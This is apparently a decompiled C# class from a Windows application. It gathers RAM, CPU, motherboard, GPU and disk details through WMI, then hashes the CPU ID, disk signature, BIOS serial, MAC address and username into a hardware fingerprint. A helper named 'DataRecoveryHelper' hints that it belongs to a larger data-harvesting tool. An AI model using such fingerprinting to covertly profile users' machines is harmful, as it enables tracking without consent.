using System;
using System.Collections.Generic;
using NoiseMe.Drags.App.Models;
using NoiseMe.Drags.App.Models.WMI.Enums;
using NoiseMe.Drags.App.Models.WMI.Objects;

namespace NoiseMe.Drags.App.Data.WMI
{
	// Token: 0x02000170 RID: 368
	public static class HardwareGatherer
	{
		// Token: 0x06000BE1 RID: 3041 RVA: 0x0002359C File Offset: 0x0002179C
		public static ICollection<RamStick> GetRamSticks()
		{
			List<RamStick> list = new List<RamStick>();
			string[] properties = new string[]
			{
				"Capacity",
				"ConfiguredClockSpeed",
				"Manufacturer",
				"SerialNumber",
				"PositionInRow"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_PhysicalMemory", properties, null);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass wmiInstanceClass in wmiInstanceClassCollection)
			{
				RamStick item = new RamStick((ulong?)wmiInstanceClass["Capacity"].Value, (uint?)wmiInstanceClass["ConfiguredClockSpeed"].Value, (string)wmiInstanceClass["Manufacturer"].Value, (string)wmiInstanceClass["SerialNumber"].Value, (uint?)wmiInstanceClass["PositionInRow"].Value);
				list.Add(item);
			}
			return list;
		}

		// Token: 0x06000BE2 RID: 3042 RVA: 0x000236AC File Offset: 0x000218AC
		public static ulong? GetTotalMemoryCapacity()
		{
			ulong? num = new ulong?(0UL);
			foreach (RamStick ramStick in HardwareGatherer.GetRamSticks())
			{
				num += ramStick.Capacity;
			}
			ulong? num2 = num;
			ulong num3 = 0UL;
			if (!(num2.GetValueOrDefault() == num3 & num2 != null))
			{
				return num;
			}
			return null;
		}

		// Token: 0x06000BE3 RID: 3043 RVA: 0x0002375C File Offset: 0x0002195C
		public static ICollection<Processor> GetProcessors()
		{
			List<Processor> list = new List<Processor>();
			string[] properties = new string[]
			{
				"CurrentClockSpeed",
				"CurrentVoltage",
				"Name",
				"Manufacturer",
				"NumberOfCores",
				"ProcessorId"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_Processor", properties, null);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass wmiInstanceClass in wmiInstanceClassCollection)
			{
				Processor item = new Processor((uint?)wmiInstanceClass["CurrentClockSpeed"].Value, (ushort?)wmiInstanceClass["CurrentVoltage"].Value, (string)wmiInstanceClass["Name"].Value, (string)wmiInstanceClass["Manufacturer"].Value, (uint?)wmiInstanceClass["NumberOfCores"].Value, (string)wmiInstanceClass["ProcessorId"].Value);
				list.Add(item);
			}
			return list;
		}

		// Token: 0x06000BE4 RID: 3044 RVA: 0x00023888 File Offset: 0x00021A88
		public static BaseBoard GetBaseBoard()
		{
			string condition = "PoweredOn = TRUE";
			string[] properties = new string[]
			{
				"Model",
				"Product",
				"Name",
				"Manufacturer",
				"SerialNumber",
				"PoweredOn"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_Baseboard", properties, condition, null);
			if (wmiInstanceClassCollection == null || wmiInstanceClassCollection.Count == 0)
			{
				return null;
			}
			WmiInstanceClass wmiInstanceClass = wmiInstanceClassCollection[0];
			return new BaseBoard((string)wmiInstanceClass["Model"].Value, (string)wmiInstanceClass["Product"].Value, (string)wmiInstanceClass["Name"].Value, (string)wmiInstanceClass["Manufacturer"].Value, (string)wmiInstanceClass["SerialNumber"].Value);
		}

		// Token: 0x06000BE5 RID: 3045 RVA: 0x00023964 File Offset: 0x00021B64
		public static ICollection<GraphicsCard> GetGraphicsCards()
		{
			List<GraphicsCard> list = new List<GraphicsCard>();
			string[] properties = new string[]
			{
				"AdapterRAM",
				"Caption",
				"Description",
				"Name"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_VideoController", properties, null);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass wmiInstanceClass in wmiInstanceClassCollection)
			{
				GraphicsCard item = new GraphicsCard((uint?)wmiInstanceClass["AdapterRAM"].Value, (string)wmiInstanceClass["Caption"].Value, (string)wmiInstanceClass["Description"].Value, (string)wmiInstanceClass["Name"].Value);
				list.Add(item);
			}
			return list;
		}

		// Token: 0x06000BE6 RID: 3046 RVA: 0x00023A50 File Offset: 0x00021C50
		public static uint? GetTotalGpuMemoryCapacity()
		{
			uint? num = new uint?(0u);
			foreach (GraphicsCard graphicsCard in HardwareGatherer.GetGraphicsCards())
			{
				num += graphicsCard.MemoryCapacity;
			}
			uint? num2 = num;
			uint num3 = 0u;
			if (!(num2.GetValueOrDefault() == num3 & num2 != null))
			{
				return num;
			}
			return null;
		}

		// Token: 0x06000BE7 RID: 3047 RVA: 0x00023AFC File Offset: 0x00021CFC
		public static ICollection<HardDrive> GetHardDrives()
		{
			List<HardDrive> list = new List<HardDrive>();
			string[] properties = new string[]
			{
				"Caption",
				"Model",
				"Signature",
				"Size"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_DiskDrive", properties, null);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass wmiInstanceClass in wmiInstanceClassCollection)
			{
				HardDrive item = new HardDrive((string)wmiInstanceClass["Caption"].Value, (string)wmiInstanceClass["Model"].Value, (uint?)wmiInstanceClass["Signature"].Value, (ulong?)wmiInstanceClass["Size"].Value);
				list.Add(item);
			}
			return list;
		}

		// Token: 0x06000BE8 RID: 3048 RVA: 0x00023BE8 File Offset: 0x00021DE8
		public static string GetHwid(HwidStrength hwidStrength, bool ignoreNullValues = false)
		{
			string text = null;
			uint? num = null;
			foreach (Processor processor in HardwareGatherer.GetProcessors())
			{
				if (processor.Id != null)
				{
					text = processor.Id;
				}
			}
			foreach (HardDrive hardDrive in HardwareGatherer.GetHardDrives())
			{
				if (hardDrive.Signature != null)
				{
					num = hardDrive.Signature;
				}
			}
			string serialNumber = BiosGatherer.GetSerialNumber();
			string activeMacAddress = NetGatherer.GetActiveMacAddress();
			switch (hwidStrength)
			{
			case HwidStrength.Light:
				if (ignoreNullValues || text != null)
				{
					return DataRecoveryHelper.GetMd5Hash(text + Environment.UserName).Replace("-", string.Empty);
				}
				return null;
			case HwidStrength.Medium:
				if (ignoreNullValues || (text != null && num != null))
				{
					return DataRecoveryHelper.GetMd5Hash(text + num + Environment.UserName).Replace("-", string.Empty);
				}
				return null;
			case HwidStrength.Strong:
				if (ignoreNullValues || (text != null && num != null && serialNumber != null && activeMacAddress != null))
				{
					return DataRecoveryHelper.GetMd5Hash(string.Concat(new object[]
					{
						text,
						num,
						serialNumber,
						activeMacAddress,
						Environment.UserName
					})).Replace("-", string.Empty);
				}
				return null;
			default:
				return null;
			}
		}
	}
}
